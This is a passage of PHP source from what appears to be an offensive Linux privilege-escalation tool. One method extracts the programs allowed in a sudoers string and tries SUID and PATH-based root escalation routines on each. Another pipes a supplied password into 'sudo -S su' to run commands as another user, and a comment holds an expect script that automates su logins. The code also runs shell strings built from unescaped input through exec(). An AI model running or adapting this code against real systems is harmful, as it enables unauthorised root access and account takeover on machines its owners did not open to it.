        $data = "echo '$sudoers_str' | grep -E \"\([a-zA-Z0-9_\-]{1,}\)\" | cut -d')' -f2  | grep -Po \"[[:space:]]{1}/[a-z0-9\-_]{1,}/[[:print:]]{1,}\"  | grep -Po \"(/[a-z0-9\-\_]{1,}(/[a-z0-9\-\_\.]{1,})+)\"  ";
        $list_apps = exec($data);
        $result .= $list_apps;
        $tab_apps = explode(",", $list_apps);
        $tab_apps = array_unique($tab_apps);
        sort($tab_apps,SORT_STRING);
        $this->article("App Sudoers", $this->tab($tab_apps));$this->pause();
        $size = count($tab_apps);
        for ($i=0;$i<$size;$i++){
            $app = $tab_apps[$i];
            $app = trim($app);
            if (!empty($app)) {
                
                $this->article("$i/$size", $app);
                if (!$this->ip2root8db($this->ip2id)) $this->lan2root8bin($app, TRUE, '');$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids4one($app);$this->pause();
                if (!$this->ip2root8db($this->ip2id)) $this->suids8env2path2xtrace($app);$this->pause();
            }
        }
        return $result;
    }
    
    
    
    
    
    
    public function users4root($user_name,$user_pass){
        $this->ssTitre(__FUNCTION__);
        /*
#!/usr/bin/expect -f
#Usage: runas.sh cmd user pass

set cmd [lindex $argv 0];
set user [lindex $argv 1];
set pass [lindex $argv 2];

log_user 0
spawn su -c $cmd - $user
expect "Password: "
log_user 1
send "$pass\r"
expect "$ "
         */
        $user_name = trim($user_name);
        $user_pass = trim($user_pass);

        //$template_id_euid = "( sleep $this->stream_timeout*3 ;echo $user_pass; sleep 5;) |  socat - EXEC:\"su --login $user_name --shell $shell --command %ID%\",pty,stderr,setsid,sigint,ctty,sane";
        $template_id_euid = "echo '$user_pass' | sudo -S su --login '$user_name' --shell /bin/bash --command '%ID%' 2>1 ";
        
        
        return $this->lan2pentest8id($template_id_euid);
        
    }
    
    
     
    
    
    
    
    
}
?>
